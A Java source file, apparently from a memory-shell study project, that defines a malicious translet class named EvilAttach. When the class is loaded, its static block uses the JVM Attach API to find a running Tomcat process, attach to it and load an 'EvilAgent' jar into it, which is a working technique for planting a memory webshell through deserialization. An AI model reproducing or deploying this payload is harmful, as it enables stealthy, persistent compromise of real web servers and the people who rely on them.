package com.exp;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.File;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.List;

public class EvilAttach extends AbstractTranslet {
    static {
        final String path = "D:\\MemoryShellStudy\\EvilAgent\\target\\EvilAgent-1.0-SNAPSHOT-jar-with-dependencies.jar";
        File file = new File(System.getProperty("java.home").replace("jre", "lib") + File.separator + "tools.jar");

        try {
            URL url = file.toURI().toURL();
            System.out.println(url);
            URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url});
            Class<?> VirtualMachine = urlClassLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class<?> VirtualMachineDescriptor = urlClassLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            Method listMethod = VirtualMachine.getDeclaredMethod("list", null);
            List list = (List) listMethod.invoke(VirtualMachine, null);

            for (Object o : list) {
                Method displayName = VirtualMachineDescriptor.getDeclaredMethod("displayName");
                String name = (String) displayName.invoke(o, null);
                System.out.println(name);
                if(name.contains("org.apache.catalina.startup.Bootstrap")) {
                    Method attach = VirtualMachine.getDeclaredMethod("attach", VirtualMachineDescriptor);
                    Object vm = attach.invoke(VirtualMachine, o);
                    Method loadAgent = VirtualMachine.getDeclaredMethod("loadAgent", String.class);
                    loadAgent.invoke(vm, path);
                    System.out.println("inject success");
                    Method detach = VirtualMachine.getDeclaredMethod("detach", null);
                    detach.invoke(vm, null);
                }
            }
        } catch (MalformedURLException | ClassNotFoundException | InvocationTargetException | NoSuchMethodException | IllegalAccessException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
